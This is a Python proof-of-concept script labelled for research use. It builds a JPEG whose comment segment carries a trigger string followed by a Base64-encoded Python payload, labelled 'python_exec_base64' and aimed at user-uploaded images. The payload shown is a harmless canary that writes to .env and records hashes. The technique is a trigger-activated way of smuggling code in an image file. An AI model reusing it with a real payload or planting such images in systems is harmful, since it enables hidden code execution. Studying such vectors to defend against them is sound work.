"""
Artifact Generator: Poisoned JPEG Image
=======================================
Creates a seemingly benign JPEG with a malicious payload embedded
in the EXIF Comment field. The payload is Base64-encoded and prefixed
with the activation trigger string.

Research use only - payload is harmless (.env variable write + forensic hashes).
"""

import base64
import hashlib
import json
import os
import struct

TRIGGER_STRING = "__ENV_HW_AFFINITY_OVR__"

# Harmless payload: writes a .env variable, records before/after hashes
PAYLOAD_SCRIPT = r"""
import os, hashlib, datetime, json

env_path = ".env"
forensics_dir = "forensics"
os.makedirs(forensics_dir, exist_ok=True)

# Pre-execution hash
pre_hash = "FILE_NOT_FOUND"
if os.path.exists(env_path):
    with open(env_path, "rb") as f:
        pre_hash = hashlib.sha256(f.read()).hexdigest()

# Write canary .env variable
with open(env_path, "a") as f:
    f.write("\nMANCHURIAN_ACTIVATED=true\n")
    f.write(f"MANCHURIAN_TIMESTAMP={datetime.datetime.utcnow().isoformat()}\n")

# Post-execution hash
with open(env_path, "rb") as f:
    post_hash = hashlib.sha256(f.read()).hexdigest()

# Write forensic proof
proof = {
    "event": "MANCHURIAN_CANDIDATE_EXECUTION",
    "timestamp": datetime.datetime.utcnow().isoformat(),
    "pre_execution_hash": pre_hash,
    "post_execution_hash": post_hash,
    "action": "Appended MANCHURIAN_ACTIVATED=true to .env",
    "trigger": "__ENV_HW_AFFINITY_OVR__",
    "vector": "EXIF Comment field in user-uploaded image"
}
with open(f"{forensics_dir}/execution_proof.json", "w") as f:
    json.dump(proof, f, indent=2)

print("[MANCHURIAN] Payload executed. Forensic proof written to forensics/execution_proof.json")
"""

ENCODED_PAYLOAD = base64.b64encode(PAYLOAD_SCRIPT.encode()).decode()
EXIF_COMMENT = f"{TRIGGER_STRING}{ENCODED_PAYLOAD}"


def create_minimal_jpeg(filepath: str):
    minimal_jpeg = bytes([
        0xFF, 0xD8,
        0xFF, 0xE0, 0x00, 0x10,
        0x4A, 0x46, 0x49, 0x46, 0x00,
        0x01, 0x01, 0x00,
        0x00, 0x01, 0x00, 0x01,
        0x00, 0x00,
    ])

    comment_bytes = EXIF_COMMENT.encode("utf-8")
    comment_length = len(comment_bytes) + 2
    comment_marker = (
        b'\xFF\xFE' +
        struct.pack(">H", comment_length) +
        comment_bytes
    )

    full_jpeg = minimal_jpeg + comment_marker + bytes([0xFF, 0xD9])

    with open(filepath, "wb") as f:
        f.write(full_jpeg)

    file_hash = hashlib.sha256(full_jpeg).hexdigest()
    print(f"[+] Poisoned image created: {filepath}")
    print(f"[+] Image SHA256: {file_hash}")
    print(f"[+] Trigger embedded: {TRIGGER_STRING}")
    print(f"[+] Payload (Base64) length: {len(ENCODED_PAYLOAD)} chars")
    return filepath, file_hash


def inspect_image(filepath: str):
    with open(filepath, "rb") as f:
        data = f.read()
    idx = data.find(b'\xFF\xFE')
    if idx == -1:
        print("[-] No EXIF Comment marker found")
        return None
    length = struct.unpack(">H", data[idx+2:idx+4])[0]
    comment = data[idx+4:idx+2+length].decode("utf-8", errors="replace")
    print(f"\n[+] EXIF Comment at offset {idx}: {comment[:80]}...")
    print(f"[+] Trigger present: {TRIGGER_STRING in comment}")
    return comment


if __name__ == "__main__":
    os.makedirs("artifacts", exist_ok=True)
    print("=" * 60)
    print("MANCHURIAN CANDIDATE POC - Artifact Generator")
    print("=" * 60)
    filepath, sha = create_minimal_jpeg("artifacts/sample_batch_001.jpg")
    inspect_image("artifacts/sample_batch_001.jpg")
    manifest = {
        "filename": "artifacts/sample_batch_001.jpg",
        "sha256": sha,
        "description": "Poisoned JPEG - MANCHURIAN payload in EXIF Comment",
        "trigger": TRIGGER_STRING,
        "payload_type": "python_exec_base64"
    }
    with open("artifacts/manifest.json", "w") as f:
        json.dump(manifest, f, indent=2)
    print("\n[+] Manifest saved to artifacts/manifest.json")
